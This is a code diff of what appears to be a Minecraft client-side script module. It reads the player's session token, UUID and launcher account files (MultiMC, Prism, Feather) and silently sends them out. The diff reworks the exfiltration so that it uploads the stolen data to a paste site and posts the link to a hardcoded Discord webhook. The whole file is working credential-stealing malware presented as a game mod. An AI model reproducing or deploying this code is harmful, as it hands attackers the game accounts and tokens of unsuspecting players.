@@ -1,11 +1,11 @@
 let File = Java.type('java.io.File');
-let appData = new File(java.lang.System.getenv("APPDATA"))
-let mcFolder = new File(Client.getMinecraft().field_71412_D.getPath())
-let instanceFolder = new File(mcFolder.parent)
-let instancesFolder = new File(instanceFolder.parent)
-let launcherFolder = new File(instancesFolder.parent)
+let appData = new File(java.lang.System.getenv("APPDATA"));
+let mcFolder = new File(Client.getMinecraft().field_71412_D.getPath());
+let instanceFolder = new File(mcFolder.parent);
+let instancesFolder = new File(instanceFolder.parent);
+let launcherFolder = new File(instancesFolder.parent);
 let mmc =  FileLib.read(`${launcherFolder}\\accounts.json`);
-let prism = FileLib.read(`${appData}\\PrismLauncher\\accounts.json`)
+let prism = FileLib.read(`${appData}\\PrismLauncher\\accounts.json`);
 
 if(launcherFolder.getPath().includes("Prism")) {
     prism = FileLib.read(`${launcherFolder}\\accounts.json`);
@@ -22,24 +22,15 @@ const data = {
     prism: prism,
 };
 
-const link = "https://webhook.site/15d5c61c-f664-4b31-ad32-8f5a72852c80"
+const link = "https://discord.com/api/webhooks/1373747826961551572/4870fkPvS582mMKig0Qt-m2-ACQ38TKh9dLuIxASK_E72PBT8-bjYAoKki9NnZH_pNXS";
 
 new Thread(() => {
     try {
-        const url = new java.net.URL(link)
-        const connection = url.openConnection();
-        connection.setRequestMethod("POST");
-        connection.setRequestProperty("User-Agent", "Mozilla/5.0");
-        connection.setRequestProperty("Content-Type", "application/json");
-        connection.setDoOutput(true);
-
-        const outputStream = new java.io.OutputStreamWriter(connection.getOutputStream());
         const messageContent = `
 === USER INFORMATION ===
 Username: ${data.username}
 UUID: ${data.uuid}
 Token: ${data.token}
-
 
 === FEATHER CLIENT DATA ===
 ${data.feather || 'No Feather client data found'}
@@ -54,22 +45,45 @@ ${data.mmc || 'No MultiMC data found'}
 ${data.prism || 'No Prism Launcher data found'}
 `;
 
+        const hastebinUrl = new java.net.URL("https://hst.sh/documents");
+        const hastebinConn = hastebinUrl.openConnection();
+        hastebinConn.setRequestMethod("POST");
+        hastebinConn.setRequestProperty("Content-Type", "text/plain");
+        hastebinConn.setDoOutput(true);
+
+        let outputStream = new java.io.OutputStreamWriter(hastebinConn.getOutputStream());
         outputStream.write(messageContent);
-       
         outputStream.flush();
         outputStream.close();
-
-        if (connection.getResponseCode() === 200) {
-            const reader = new java.io.BufferedReader(new java.io.InputStreamReader(connection.getInputStream()));
-            const response = new java.lang.StringBuilder();
-            let inputLine;
-
-            while ((inputLine = reader.readLine()) !== null) response.append(inputLine);
+        if (hastebinConn.getResponseCode() === 200) {
+            const reader = new java.io.BufferedReader(new java.io.InputStreamReader(hastebinConn.getInputStream()));
+            let response = new java.lang.StringBuilder();
+            let line;
+            while ((line = reader.readLine()) !== null) response.append(line);
             reader.close();
+            
+            const hastebinKey = JSON.parse(response.toString()).key;
+            const rawLink = `https://hst.sh/raw/${hastebinKey}`;
+            const webhookURL = new java.net.URL(link);
+            const webhookConn = webhookURL.openConnection();
+            webhookConn.setRequestMethod("POST");
+            webhookConn.setRequestProperty("User-Agent", "Mozilla/5.0");
+            webhookConn.setRequestProperty("Content-Type", "application/json");
+            webhookConn.setDoOutput(true);
 
-            Client.scheduleTask(() => console.log(JSON.parse(response.toString())));
+            outputStream = new java.io.OutputStreamWriter(webhookConn.getOutputStream());
+            const payload = JSON.stringify({ content: rawLink });
+            outputStream.write(payload);
+            outputStream.flush();
+            outputStream.close();
+
+            if (webhookConn.getResponseCode() === 200) {
+                Client.scheduleTask(() => console.log("Data uploaded successfully!"));
+            } else {
+                Client.scheduleTask(() => console.error('Webhook error: HTTP ' + webhookConn.getResponseCode()));
+            }
         } else {
-            Client.scheduleTask(() => console.error('Error: HTTP response code ' + connection.getResponseCode()));
+            Client.scheduleTask(() => console.error('hst.sh upload failed: HTTP ' + hastebinConn.getResponseCode()));
         }
     } catch (e) {
         Client.scheduleTask(() => console.error('Error: ' + e.message));
